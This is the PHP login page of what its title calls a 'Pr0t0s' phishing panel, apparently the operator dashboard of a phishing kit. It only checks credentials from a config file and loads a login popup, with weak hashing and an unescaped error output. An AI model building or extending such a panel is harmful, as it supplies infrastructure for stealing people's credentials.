<?php


session_start(); 
require_once('inc/config.php');

	if($_SESSION['login']) { header('Location: index.php'); exit(); }

	$user = $_POST[user];
	$pass = sha1(md5(htmlspecialchars($_POST[pass])));
	
	if(isset($_POST['login'])){
		if($user == $username_ && $pass == sha1(md5(htmlspecialchars($password_)))){
				$_SESSION['login'] = true;
				$_SESSION['username'] = $user;
				header('Location: index.php');
		}else{
			$error = 'Username and password required!';
		}
	}
?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN"
        "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" lang="en" xml:lang="en">
<head>
<title>Pr0t0s - Phishing Panel v 1.0</title>
<link rel="stylesheet" type="text/css" href="css/style3.css"/>
<link rel="stylesheet" type="text/css" href="css/facebox.css" />
<script type="text/javascript" src="http://ajax.googleapis.com/ajax/libs/jquery/1.4.2/jquery.min.js"></script>
<script language="javascript" src="js/facebox.js"></script>
<script language="javascript">
$(document).ready(function(){
    jQuery.facebox(function() {
        jQuery.get('facebox/login.php', function(data) {
            jQuery.facebox(data);
        });
    });
}); 
</script>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
</head>
<body>
<?php echo '<p align="center">'.$error.'</p>'; ?>
</body>
</html>